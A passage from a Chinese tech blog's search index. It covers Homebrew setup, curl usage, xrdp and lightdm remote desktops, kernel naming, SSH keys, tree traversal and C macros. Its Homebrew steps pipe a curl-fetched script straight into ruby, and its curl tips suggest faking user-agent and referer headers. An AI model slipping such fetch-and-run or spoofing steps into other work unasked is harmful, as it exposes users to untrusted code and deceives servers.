root用户可以通过renice来任意调整进程的优先级","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Shell/"}]},{"title":"Mac_Homebrew 软件包管理器","slug":"commands/Mac-Homebrew-软件包管理器","date":"2017-12-01T09:36:24.000Z","updated":"2018-12-05T11:02:48.049Z","comments":false,"path":"2017/12/01/commands/Mac-Homebrew-软件包管理器/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/12/01/commands/Mac-Homebrew-软件包管理器/","excerpt":"安装HomeBrew 首先打开App Stroe 更新系统，安装最新版本xcode; 安装HomeBrew 到 /usr/local 1/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;","text":"安装HomeBrew 首先打开App Stroe 更新系统，安装最新版本xcode; 安装HomeBrew 到 /usr/local 1/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; 卸载HomeBrew1ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)&quot; 重装 备份/usr/lcoal/Cellar 删除HomeBrew相关文件 1234cd /usr/localsudo rm -rf Library .git .gitignore bin/brew README.md share/man/man1/brewsudo rm -rf Homebrewsudo rm -rf ~/Library/Caches/Homebrew 卸载HomeBrew 1ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)&quot; 安装HomeBrew 1/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; 将第一步备份文件放回原处 更新Homebrew以及管理的软件 123brew updatebrew upgradebrew cleanup brew doctor检测Homebrew潜在问题，并自行排错。如使用 brew link 软件名 将备份的软件重新symlink到Homebrew上。 Homebrew 使用 安装软件 1brew install 软件名 ## brew install git ​ 卸载软件 1brew uninstall 软件名 ## brew uninstall git ​ 查找软件 1brew search 查询内容 普通查询 1brew search git 正则查询 1brew search /gi*/ ​ 升级软件 指定更新软件 1brew upgrade 软件名 ## brew upgrade git 更新所有软件 1brew upgrade ​ 清理软件 查看哪些软件要被清楚 1brew cleanup -n 清除指定软件的所有老版本 1brew cleanup 软件名 清除所有软件的老版本 1brew cleanup ​ 关联软件 清除无用的symlink, 且清除与之相关的位于 /Application 和 ~/Applications 中的无用App链接 1brew prune 将指定软件的安装文件symlink 到HomeBrew上 1brew link 软件名 brew install 安装的软件会自动执行link操作 DIY安装的需要手动link操作 加上 –overwrite选项, 会先删除旧的symlink, 再进行新的link操作 ​ 信息查询 查看Homebrew版本号 1brew -v 列出已安装的软件 1brew list 用浏览器打开homebrew官网 1brew home 显示软件信息 1brew info ​ 其他操作 升级homebrew自身软件关联 1brew update 检测系统中与homebrew有关的潜在问题 1brew doctor ​","categories":[{"name":"包管理","slug":"包管理","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/包管理/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Mac/"}]},{"title":"curl详细说明以及示例","slug":"commands/curl详细说明以及示例","date":"2017-11-13T13:06:40.000Z","updated":"2018-12-05T11:05:35.722Z","comments":false,"path":"2017/11/13/commands/curl详细说明以及示例/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/11/13/commands/curl详细说明以及示例/","excerpt":"Curl一个功能非常强大的命令行工具，支持HTTP、FTP等协议。本文以访问gangzai.online为示例，供大家学习使用。","text":"Curl一个功能非常强大的命令行工具，支持HTTP、FTP等协议。本文以访问gangzai.online为示例，供大家学习使用。 http://url:portHttp​ HTTP协议用于从web服务器上读取数据，它是基于TCP/IP协议上的一个简单的协议。该协议同时也能够让你通过使用一些不同的方法向服务器提交数据。 ​ HTTP协议是向服务器发送的要进行一个特殊操作的ACSII文本，随后在要求的内容发送给客户端之前，服务器会向客户端发送几行回应的数据。 ​ 客户端CURL向服务器发送一项请求，请求通常包括方法（比如GET、POST、HEAD等等）、一些请求的头、有时还有请求正文。接到请求后，服务器返回状态行（表明访回是否顺利）、回应头和内容正文。正文是客户要求的数据，通常是一些HTML资源、图片。 curl -v , -verbose 会显示curl向服务器发送的命令和其他的一些信息. 123456789$ curl -verbose gangzai.online* Connected to gangzai.online (151.101.1.147) port 80 (#0)&gt; GET / HTTP/1.1&gt; User-Agent: curl/7.35.0&gt; Host: gangzai.online&gt; Accept: */*&gt; &lt; HTTP/1.1 200 OK Url​ URL（统一资源定位符）用来描述Internet上一个资源详细地址的规范，大家可能看到过很多次这样的地址，比如www.baidu.com，www.dachengge.com，j定义这个规范最权威的标准是RFC 3986。 端口​ 每一个CURL支持的协议都是运行在特定的端口上，通常情况下不用端口的问题，除非进行网站的测试，而使用不同的端口，这是可以使用不同的端口，使用的方法是，在网站域名后面家一个端口号，用冒号隔开，例如： 1curl http://dachengge.com:80/ 如果使用代理服务器时，也可以指定代理服务器的端口号: 1curl –proxy http://abc.com:80 http:dachengge.com/ 使用账号和密码​ 有时有些服务需要HTTP认证，当访问这些网站时需要提供账号和密码，这是你需要在URL里面提供账号密码，或者单独提供: 12CURL http://user:password@example.com/CURL -u user:password http://example.com/ Cookies浏览器通过使用Cookie来记录客户端的状态，并向服务器发送。Cookies是键=》值对应的形式，服务器向客户端发送cookies的到期时间和其他一些属性。 很多应用使用Cookies连接服务器，并进行一系列操作，完成一个会话。CURL要是完成这样的操作，就必须保存Cookies。 cookies选项最简单发送Cookies的方法就是向服务器发送请求的同时加上这些数据： 1curl –cookie “name=Daniel” http://www.dachengge.com Cookies像其他HTTP头一样发送，这对于CURL记录这头非常有用，使用–dump-header记，将HEADER和Cookies存在文件里： 1curl –dump-header headers_and_cookies www.dachengge.com 如果只记录下Cookies，使用–cookie-jar： 1curl –cookie-jar cookieFile http://www.dachengge.com 自动更新和追踪cookies如果让curl自动保存新的cookie，且提交请求时再带上新的cookie时，可以将–cookie 和–cookie-jar 指向同一个文件： 12curl –include –cookie “cook.txt” –cookie-jar “cook.txt” http://dachengge.comcurl –include –cookie “cook.txt” –cookie-jar “cook.txt” http://abc.dachengge.com 即每行指令中都读取和写入相同的cookie文件，系统会自动更新cookie。 使用变量保存cookies上一节讲的使用–cookie和–cookie-jar是利用文件来保存和读取cookie，由于文件操作比较费资源，下面将讨论不使用文件，而是使用变量来保存和读取cookie: 当输入：curl www.baidu.com –head， 大家会看到百度首页的头信息，里面有很多set-cookies，即设置cookie变量。首先将目标网页的头保存，然后用grep查找cookie。。。 HTML 表单使用GET方法的表单HTML中使用GET方法提交数据的页面是这样的: 1234&lt;form method=”GET” action=”junk.cgi”&gt; &lt;input type=text name=”birthyear”&gt; &lt;input type=submit name=press value=”OK”&gt;&lt;/form&gt; ​ 如果对浏览器熟悉的话，上面的代码就会显示成，一个文本框和一个OK按钮。这是填入1905，然后点击“OK“，浏览器就会生成一个新的URL地址，URL会将”junk.cgi?birthyear=1905&amp;press=OK“添加到之前的URL地址后面。如果之前表单页面地址是 “www.hotmail.com/when/birth.html”，在表单上填写1905，点击OK按钮后，随之打开的页面会变成 “www.hotmail.com/when/junk.cgi?birthyear=1905&amp;press=OK”。要使用CURL程序用GET方法提交数据，直接将数据放在ACTION指向的页面（以前面的表单为例）: 1curl &quot;http://www.hotmail.com/junk.cgi?birthyear=1905&amp;press=OK&quot; 使用POST方法的表单GET方法将所有的输入域名称和值都放在URL地址里面，如果能通过值来做某些页面的书签（例如www.abc.com/index.php?id=18保存成书签可以直接访问），GET通常是个好办法，但是如果输入的数据是保密的或者有大量的数据要输入时，会产生一个非常长的URL地址。下面是一个使用POST方法的表单: 1234&lt;form method=”POST” action=”junk.cgi”&gt; &lt;input type=text name=”birthyear”&gt; &lt;input type=submit name=press value=” OK “&gt;&lt;/form&gt; CURL命令使用POST方法提交和上面相同的数据，就会使这样： 1curl –data &quot;birthyear=1905&amp;press=%20OK%20&quot; http://www.example.com/when.cgi 注意，OK前面和后面的%20是空格，使用了urlencode编码，POST方法的Content-Type通常是application/x-www-form-urlencoded。通过POST方法向服务器发送的数据必须被编码，新版本的CURL使用–data-urlencode编码，前面的空格变成%20就是这个道理。 1curl –data-urlencode &quot;name=I am Daniel&quot; http://www.example.com 如果在一个命令行里面多次使用–data参数，CURL会将所有–data后面的数据使用&amp;拼接起来。 文件上传提交在1995年，他们定义另外一种HTTP提交数据的方法，这种方法在RFC 1867中有描述。这种方法设计得能更好地支持文件上传，假设文件上传的表是这样的： 1234&lt;form method=”POST” enctype=’multipart/form-data’ action=”upload.cgi”&gt; &lt;input type=file name=upload&gt; &lt;input type=submit name=press value=”OK”&gt;&lt;/form&gt; 从encType是上可以看出，将要发送的数据类型是multipart/form-data，即文件类型 。通过CURL向服务器传递数据的命令如下: 1curl –form upload=@localfilename –form press=OK [URL] 络访问注意事项为了使CURL访问网页时跟浏览器访问的一样，就必须注意下面的事项： 使用–trace-ascii把所有的细节记录下来，分析和研究。 确定检查和使用Cookie，使用–cookie读取，使用–cookie-jar写入cookie。 使用user-agent仿冒浏览器。 使用referer让服务器觉得是合法的访问请求。 使用POST时，要按照文本域的顺序提交。 参数 示例1234567891011121314151617181920212223242526272829303132-A:随意指定自己这次访问所宣称的自己的浏览器信息-b/--cookie &lt;name=string/file&gt; cookie字符串或文件读取位置，使用option来把上次的cookie信息追加到http request里面去。-c/--cookie-jar &lt;file&gt; 操作结束后把cookie写入到这个文件中-C/--continue-at &lt;offset&gt; 断点续转-d/--data &lt;data&gt; HTTP POST方式传送数据-D/--dump-header &lt;file&gt; 把header信息写入到该文件中-F/--form &lt;name=content&gt; 模拟http表单提交数据-v/--verbose 小写的v参数，用于打印更多信息，包括发送的请求信息，这在调试脚本是特别有用。-m/--max-time &lt;seconds&gt; 指定处理的最大时长-H/--header &lt;header&gt; 指定请求头参数-x ip:port 指定使用的http代理，例如：curl -x 192.168.1.1:8080 www.jbxue.com-D head.txt 将服务器的返回的header保存为文件，头部的cookie也可被保存，例如：curl -D header.txt www.jbxue.com 如果希望从本地文件中获取表单数据，则在文件名前加@ ，例如：curl -d @data.xml http://www.jbxue.com 若希望从标准输入获取则用 curl -d &quot;name=username&amp;passwd=pwd&quot; http://www.jbxue.com-X/--request method 用户定义的HTTP请求方法名如 curl -X GET www.baidu.com-k/--insecure 允许不使用证书到SSL站点-s/--slient 减少输出的信息，比如进度--connect-timeout &lt;seconds&gt; 指定尝试连接的最大时长-x/--proxy &lt;proxyhost[:port]&gt; 指定代理服务器地址和端口，端口默认为1080-T/--upload-file &lt;file&gt; 指定上传文件路径-o/--output &lt;file&gt; 指定输出文件名称--retry &lt;num&gt; 指定重试次数-e/--referer &lt;URL&gt; 指定引用地址-I/--head 仅返回头部信息，使用HEAD请求-u/--user &lt;user[:password]&gt;设置服务器的用户和密码-O:按照服务器上的文件名，自动存在本地-r/--range &lt;range&gt;检索来自HTTP/1.1或FTP服务器字节范围-T/--upload-file &lt;file&gt; 上传文件 断点续传12345671 # 当文件在下载完成之前结束该进程2 $ curl -O http://www.gnu.org/software/gettext/manual/gettext.html3 ############## 20.1%4 5 # 通过添加-C选项继续对该文件进行下载，已经下载过的文件不会被重新下载6 curl -C - -O http://www.gnu.org/software/gettext/manual/gettext.html7 ############### 21.1% 上传带Ftp服务器12345# 将myfile.txt文件上传到服务器curl -u ftpuser:ftppass -T myfile.txt ftp://ftp.testserver.com# 同时上传多个文件curl -u ftpuser:ftppass -T &quot;&#123;file1,file2&#125;&quot; ftp://ftp.testserver.com I/i 区别12345显示 HTTP request头信息curl -i www.baidu.com显示 HTTP response头信息curl -I www.baidu.com","categories":[{"name":"命令","slug":"命令","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"rdp_远程连接Linux","slug":"yunwei/rdp-远程连接Linux","date":"2017-11-12T11:40:50.000Z","updated":"2017-12-03T03:22:07.911Z","comments":false,"path":"2017/11/12/yunwei/rdp-远程连接Linux/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/11/12/yunwei/rdp-远程连接Linux/","excerpt":"一般情况下我们用ssh客户端远程登陆Linux系统，至于图形界面下的linux远程登陆工具，我们一般都会想到vnc，但它的安全性不够， 在这里，我将介绍XRDP的安装配置方法。我们可以很方便的通过windows远程桌面 linux。 xrdp安装配置方法打开终端：依次安装 123sudo apt-get install xrdpsudo apt-get install vnc4server tightvncserver","text":"一般情况下我们用ssh客户端远程登陆Linux系统，至于图形界面下的linux远程登陆工具，我们一般都会想到vnc，但它的安全性不够， 在这里，我将介绍XRDP的安装配置方法。我们可以很方便的通过windows远程桌面 linux。 xrdp安装配置方法打开终端：依次安装 123sudo apt-get install xrdpsudo apt-get install vnc4server tightvncserver 设置xrdp gnome 界面 12$ sudo apt-get install gnome-shell$ sudo apt-get install ubuntu-gnome-desktop ​ 1echo &quot;gnome-session --session=gnome-classic&quot; &gt; ~/.xsession ##配置xdrp 该命令的作用是由于安装了 gnome桌面，ubuntu12.04中同时存在unity、GNOME多个桌面管理器，需要启动的时候指定一个，不然即使远程登录验证成功以后，也只是背景。 xrdp的配置文档在/etc/xrdp目录下的xrdp.ini和sesman.in，一般选择默认。 ​ xfce4图形界面 1sudo apt-get install xfce4 1echo &quot;xfce4-session&quot; &gt; ~/.xsession ##配置xdrp 重启 xrdp1sudo /etc/init.d/xrdp restart 问题 Xrdp 链接出现 no display in range is available 原因: 最大链接session达到限制值, 修改 /etc/xrdp/sesman.ini 12$sudo vi /etc/xrdp/sesman.iniMaxSessions=100 ​","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"}]},{"title":"xmanage-通过xdmcp远程连接Ubuntu","slug":"yunwei/xmanage-通过xdmcp远程连接Ubuntu","date":"2017-11-06T14:06:14.000Z","updated":"2018-11-19T16:15:43.530Z","comments":true,"path":"2017/11/06/yunwei/xmanage-通过xdmcp远程连接Ubuntu/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/11/06/yunwei/xmanage-通过xdmcp远程连接Ubuntu/","excerpt":"XDMCP（X Display Manager Control Protocol）X显示监控协议。 12sudo apt-get install aptitudeaptitude install lightdm ## 安装lightdm","text":"XDMCP（X Display Manager Control Protocol）X显示监控协议。 12sudo apt-get install aptitudeaptitude install lightdm ## 安装lightdm 配置lightdmlightdm 配置文件存在于: /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf 12345678910111213141516$ sudo vim /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf[SeatDefaults]user-session=mate #将其改为mate, 并添加如下几行allow-guest=falsegreeter-show-manual-login=truegreeter-hide-users=true [XDMCPServer]enabled=true $ sudo service lightdm restart ## /etc/init.d/lightdm restart$ netstat -anp |grep 177 ## 是否启动成功udp 0 0 0.0.0.0:177 0.0.0.0:* - udp6 0 0 :::177 :::* 禁止访客登录 LightDM 默认允许你以临时访客登录，禁止该功能： 12[SeatDefaults]allow-guest=false 隐藏用户列表 Unity Greeter（其他类似欢迎界面也一样）默认显示一个用户列表。如果你想禁用该功能，可以使用以下配置，以下配置也可以用以启动手动登录。 12[SeatDefaults]greeter-hide-users=true 允许手动登录 Unity Greeter 默认不允许你输入用户名来登录。你可以使用以下配置启用该特性。 12[SeatDefaults]greeter-show-manual-login=true 设置自动登录 设置 autologin-user 来设置系统启动时自动登录某个帐户。设置 autologin-user-timeout 限制用户在设定秒内如果没有自动登录则不能自动登录。 123[SeatDefaults]autologin-user=usernameautologin-user-timeout=delay 设置自动登录访客账号。 1autologin-guest=true 修改默认会话 默认会话设置保存在 /usr/share/lightdm/lightdm.conf.d/ 会话包中。 12[SeatDefaults]user-session=name 其中 name 代表 /usr/share/xsessions/*.desktop 中 .desktop。 12345678$ ls -ls /usr/share/xsessions4 -rw-r--r-- 1 root root 231 Mar 13 2014 gnome-classic.desktop4 -rw-r--r-- 1 root root 216 Mar 27 2015 gnome.desktop4 -rw-r--r-- 1 root root 272 Oct 1 2014 gnome-fallback-compiz.desktop4 -rw-r--r-- 1 root root 310 Oct 1 2014 gnome-fallback.desktop8 -rw-r--r-- 1 root root 6773 Mar 21 2015 mate.desktop4 -rw-r--r-- 1 root root 213 Mar 27 2015 ubuntu.desktop ​ ​ 安装用户界面(xfce4, meta, gnome 可选):123$ sudo apt-add-repository ppa:ubuntu-mate-dev/ppa$ sudo apt-add-repository ppa:ubuntu-mate-dev/trusty-mate$ sudo apt-get update 123$ sudo apt-get install mate-desktop-environment-core #安装一个最小化的mate桌面$ sudo apt-get install mate-desktop-environment #安装一个完整的mate桌面$ sudo apt-get install mate-desktop-environment-extras #安装一个完整的mate桌面(包含推荐的软件包) 1$ sudo apt-get install xfce4 12$ sudo apt-get install gnome-shell$ sudo apt-get install ubuntu-gnome-desktop","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"}]},{"title":"Kernel-内核版本命令规则","slug":"kernel/Kernel-内核版本命令规则","date":"2017-11-01T01:43:55.000Z","updated":"2018-11-19T16:13:44.727Z","comments":true,"path":"2017/11/01/kernel/Kernel-内核版本命令规则/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/11/01/kernel/Kernel-内核版本命令规则/","excerpt":"Linux内核版本有两种：稳定版和开发版 ，Linux内核版本号由3个数字组成：r.x.y r：目前发布的内核主版本。 x：偶数表示稳定版本；奇数表示开发中版本。 y：错误修补的次数。","text":"Linux内核版本有两种：稳定版和开发版 ，Linux内核版本号由3个数字组成：r.x.y r：目前发布的内核主版本。 x：偶数表示稳定版本；奇数表示开发中版本。 y：错误修补的次数。 内核版本号每位都代表什么 ? ​ 以版本号为例： 2.6.9-5.ELsmp , ​ r: 2 , 主版本号 ​ x: 6 , 次版本号，表示稳定版本 ​ y: 9 , 修订版本号 ， 表示修改的次数 头两个数字合在一齐可以描述内核系列。如稳定版的2.6.0，它是2.6版内核系列。 ​ 5: 表示这个当前版本的第5次微调patch ， 而ELsmp指出了当前内核是为ELsmp特别调校的 ​ EL : Enterprise Linux ； smp : 表示支持多处理器 ， 表示该内核版本支持多处理器 知识延伸 一般的有三种: smp bigmem 一般的内核 ​ Red Hat Linux开机的时候，GRUB的启动菜单会有两个选项，分别是 Red Hat Enterprise Linux ES (版本号.ELsmp) Red Hat Enterprise Linux ES-up (版本号.EL) 这两个分别是代表什么含义呢? 其实这个就是系统开机时由GRUB引导启动 － 单处理器 与 对称多处理器启动核心文件的区别。 Red Hat Enterprise Linux ES (版本号.ELsmp) multiple processor (symmetric multiprocessing ) Red Hat Enterprise Linux ES-up (版本号.EL) uniprocessor 下面就把SUSE与Red Hat启动菜单内可选择的选项，列举出来 SUSE: 版本号-default: SUSE Linux kernel for uniprocessor machines 默认选项，支持单处理器机器 版本号-smp: SUSE Linux kernel that supports symmetric multiprocessing and up to 4 GB of RA 支持4GB内存的对称多处理器机器 版本号-bigsmp: SUSE Linux kernel supports symmetric multiprocessing and up to 64 GB 支持64GB内存的对称多处理器机器 Red Hat Linux 版本号.EL: Red Hat Linux kernel for uniprocessor machines 支持单处理器机器 版本号.ELhugemem: Red Hat Linux kernel that supports up to 64 GB of RAM 支持64GB内存的对称多处理器机器 版本号.ELsmp: Red Hat Linux kernel that supports symmetric multiprocessing 对称多处理器机器，支持4G内存","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Kernel","slug":"Kernel","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kernel/"}]},{"title":"Github SSh key以及多个rsa配置","slug":"software/Github-SSh-key以及多个rsa配置","date":"2017-10-28T13:25:07.000Z","updated":"2018-12-05T10:56:01.856Z","comments":true,"path":"2017/10/28/software/Github-SSh-key以及多个rsa配置/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/10/28/software/Github-SSh-key以及多个rsa配置/","excerpt":"生成SSH key Github 添加公钥 ssh/config写法 config权限","text":"生成SSH key Github 添加公钥 ssh/config写法 config权限 生成SSH Key在shell中键入以下命令:ssh-keygen -t rsa -C &quot;your_email@example.com&quot; 将会提示输入存放秘钥的文件名。以及密码。 命令完成后会生成两个文件 id_rsa私钥和id_rsa.pub公钥，将其放置于 ~/.ssh/ 目录下。 GitHub添加公钥拷贝 id_rsa.pub 中内容，添加到github的ssh-key的配置中。 多个rsa文件时在 ~/.ssh/ 编写config文件 1234567891011Host aaa.com User git HostName aaa.com PreferredAuthentications publickey IdentityFile ~/.ssh/id_rsa.gitlab_postgres # githubHost github.com HostName github.com PreferredAuthentications publickey IdentityFile ~/.ssh/github_rsa config权限问题123456Cloning into &apos;REL_10_HG_Rman&apos;...Bad owner or permissions on /home/Postgres/.ssh/configfatal: Could not read from remote repository.Please make sure you have the correct access rightsand the repository exists. 更改权限为: 1sudo chmod 0600 config 参考Linux-SSH公钥登陆服务器","categories":[{"name":"Github","slug":"Github","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Github/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Software","slug":"Software","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Software/"}]},{"title":"树的遍历","slug":"alogr/树的遍历","date":"2017-10-25T01:24:14.000Z","updated":"2018-10-31T11:28:05.692Z","comments":false,"path":"2017/10/25/alogr/树的遍历/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/10/25/alogr/树的遍历/","excerpt":"树的遍历是图的遍历的一种，指按照某种规则，不重复地访问某种树的所有节点过程, 具体的访问操作可能是检查节点值，更新，插入，删除等， 不同的遍历方式其访问节点的顺序是不一样的。","text":"树的遍历是图的遍历的一种，指按照某种规则，不重复地访问某种树的所有节点过程, 具体的访问操作可能是检查节点值，更新，插入，删除等， 不同的遍历方式其访问节点的顺序是不一样的。 术语 节点的度：一个节点含有的子树的个数称为该节点的度； 树的度：一棵树中，最大的节点的度称为树的度； 叶节点或终端节点：度为零的节点； 非终端节点或分支节点：度不为零的节点； 父亲节点或父节点：若一个节点含有子节点，则这个节点称为其子节点的父节点； 孩子节点或子节点：一个节点含有的子树的根节点称为该节点的子节点； 兄弟节点：具有相同父节点的节点互称为兄弟节点； 节点的层次：从根开始定义起，根为第1层，根的子节点为第2层，以此类推； 深度：对于任意节点n,n的深度为从根到n的唯一路径长，根的深度为0； 高度：对于任意节点n,n的高度为从n到一片树叶的最长路径长，所有树叶的高度为0； 堂兄弟节点：父节点在同一层的节点互为堂兄弟； 节点的祖先：从根到该节点所经分支上的所有节点； 子孙：以某节点为根的子树中任一节点都称为该节点的子孙。 森林：由m（m&gt;=0）棵互不相交的树的集合称为森林； 遍历种类先序遍历指先访问根，然后访问子树的遍历方式 其C代码如下： 1234567891 void pre_order_traversal(TreeNode *root) &#123;2 // Do Something with root3 if (root-&gt;lchild != NULL)4 pre_order_traversal(root-&gt;lchild);5 if (root-&gt;rchild != NULL)6 pre_order_traversal(root-&gt;rchild);7 &#125;//结果: 1, 2, 4, 5, 7, 8, 3, 6 中序遍历指先访问左（右）子树，然后访问根，最后访问右（左）子树的遍历方式 其C代码如下 1234567891 void in_order_traversal(TreeNode *root) &#123;2 if (root-&gt;lchild != NULL)3 in_order_traversal(root-&gt;lchild);4 // Do Something with root5 if (root-&gt;rchild != NULL)6 in_order_traversal(root-&gt;rchild);7 &#125;//结果: 4, 2, 7, 5, 8, 1, 3, 6 后序遍历指先访问子树，然后访问根的遍历方式 其C代码如下 1234567891 void post_order_traversal(TreeNode *root) &#123;2 if (root-&gt;lchild != NULL)3 post_order_traversal(root-&gt;lchild);4 if (root-&gt;rchild != NULL)5 post_order_traversal(root-&gt;rchild);6 // Do Something with root7 &#125;//结果：4, 7, 8, 5, 2, 6, 3, 1 树的种类 无序树：树中任意节点的子节点之间没有顺序关系，这种树称为无序树，也称为自由树； 有序树：树中任意节点的子节点之间有顺序关系，这种树称为有序树； 二叉树：每个节点最多含有两个子树的树称为二叉树； 完全二叉树：对于一颗二叉树，假设其深度为d（d&gt;1）。除了第d层外，其它各层的节点数目均已达最大值，且第d层所有节点从左向右连续地紧密排列，这样的二叉树被称为完全二叉树； 满二叉树：所有叶节点都在最底层的完全二叉树； 平衡二叉树（AVL树）：当且仅当任何节点的两棵子树的高度差不大于1的二叉树； 排序二叉树(二叉查找树（英语：Binary Search Tree），也称二叉搜索树、有序二叉树)； 霍夫曼树：带权路径最短的二叉树称为哈夫曼树或最优二叉树； B树：一种对读写操作进行优化的自平衡的二叉查找树，能够保持数据有序，拥有多余两个子树。优化的自平衡的二叉查找树，能够保持数据有序，拥有多余两个子树。","categories":[],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Algorithm/"}]},{"title":"Linux-c 宏定义中使用do_while(0)","slug":"cpluscplus/Linux-c-宏定义中使用do-while-0","date":"2017-10-19T07:31:34.000Z","updated":"2018-11-19T16:04:39.108Z","comments":true,"path":"2017/10/19/cpluscplus/Linux-c-宏定义中使用do-while-0/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/10/19/cpluscplus/Linux-c-宏定义中使用do-while-0/","excerpt":"Linux 内核 c库中等很多开源代码中, 宏都是如下定义: 1234#define update_zmalloc_stat_free(__n) do &#123; \\ size_t _n = (__n); \\ if(_n&amp;(sizeof(long)-1)) _n += sizeof(long)-(_n&amp;(sizeof(long)-1)); \\&#125; while(0)","text":"Linux 内核 c库中等很多开源代码中, 宏都是如下定义: 1234#define update_zmalloc_stat_free(__n) do &#123; \\ size_t _n = (__n); \\ if(_n&amp;(sizeof(long)-1)) _n += sizeof(long)-(_n&amp;(sizeof(long)-1)); \\&#125; while(0) 用途: ​ do{…}while(0)在C中是唯一的构造程序，让你定义的宏总是以相同的方式工作，这样不管怎么使用宏（尤其在没有用大括号包围调用宏的语句），宏后面的分号也是相同的效果。 总的意思， 是我们无论怎么使用宏， 都不会因为是否使用大括号等单行语句，导致语句的歧义; 例如: 12345#define Swap(a, b) do &#123; \\ int x = a; \\ a = b; \\ b = x; \\&#125; while(0) 12if( true ) Swap(1, 2); // 调用宏; 变形为: 123456if( true ) do &#123; int x = a; a = b; b = x; &#125; while(0) // 不存在任何语法上的歧义，总能得到正确结果; 不使用 do-while(0): 1234if( true ) int x = a; a = b; b = x; 解析的结果是不同的, 造成歧义","categories":[],"tags":[{"name":"C/C++","slug":"C-C","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/C-C/"}]},{"title":"查看硬件信息","slug":"commands/Linux-查看硬件信息","date":"2017-10-15T12:10:42.000Z","updated":"2018-12-05T11:01:34.545Z","comments":true,"path":"2017/10/15/commands/Linux-查看硬件信息/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/10/15/commands/Linux-查看硬件信息/","excerpt":"查看信息命令系统 12345678uname -a # 查看内核/操作系统/CPU信息head -n 1 /etc/issue # 查看操作系统版本 cat /proc/cpuinfo # 查看CPU信息hostname # 查看计算机名 lspci -tv # 列出所有PCI设备lsusb -tv # 列出所有USB设备 lsmod # 列出加载的内核模块env # 查看环境变量 资源 1234567free -m # 查看内存使用量和交换区使用量 df -h # 查看各分区使用情况 du -sh &lt;目录名&gt; # 查看指定目录的大小 grep MemTotal /proc/meminfo # 查看内存总量grep MemFree /proc/meminfo # 查看空闲内存量uptime # 查看系统运行时间、用户数、负载 cat /proc/loadavg # 查看系统负载 磁盘和分区 12345mount | column -t # 查看挂接的分区状态 fdisk -l # 查看所有分区 swapon -s # 查看所有交换分区hdparm -i /dev/hda # 查看磁盘参数(仅适用于IDE设备) dmesg | grep IDE # 查看启动时IDE设备检测状况 网络 123456ifconfig # 查看所有网络接口的属性iptables -L # 查看防火墙设置 route -n # 查看路由表 netstat -lntp # 查看所有监听端口 netstat -antp # 查看所有已经建立的连接netstat -s # 查看网络统计信息 进程 12ps -ef # 查看所有进程 top # 实时显示进程状态 用户 123456w # 查看活动用户 id &lt;用户名&gt; # 查看指定用户信息 last # 查看用户登录日志 cut -d: -f1 /etc/passwd # 查看系统所有用户 cut -d: -f1 /etc/group # 查看系统所有组 crontab -l # 查看当前用户的计划任务 服务 12chkconfig --list # 列出所有系统服务 chkconfig --list | grep on # 列出所有启动的系统服务 程序 1rpm -qa # 查看所有安装的软件包","text":"查看信息命令系统 12345678uname -a # 查看内核/操作系统/CPU信息head -n 1 /etc/issue # 查看操作系统版本 cat /proc/cpuinfo # 查看CPU信息hostname # 查看计算机名 lspci -tv # 列出所有PCI设备lsusb -tv # 列出所有USB设备 lsmod # 列出加载的内核模块env # 查看环境变量 资源 1234567free -m # 查看内存使用量和交换区使用量 df -h # 查看各分区使用情况 du -sh &lt;目录名&gt; # 查看指定目录的大小 grep MemTotal /proc/meminfo # 查看内存总量grep MemFree /proc/meminfo # 查看空闲内存量uptime # 查看系统运行时间、用户数、负载 cat /proc/loadavg # 查看系统负载 磁盘和分区 12345mount | column -t # 查看挂接的分区状态 fdisk -l # 查看所有分区 swapon -s # 查看所有交换分区hdparm -i /dev/hda # 查看磁盘参数(仅适用于IDE设备) dmesg | grep IDE # 查看启动时IDE设备检测状况 网络 123456ifconfig # 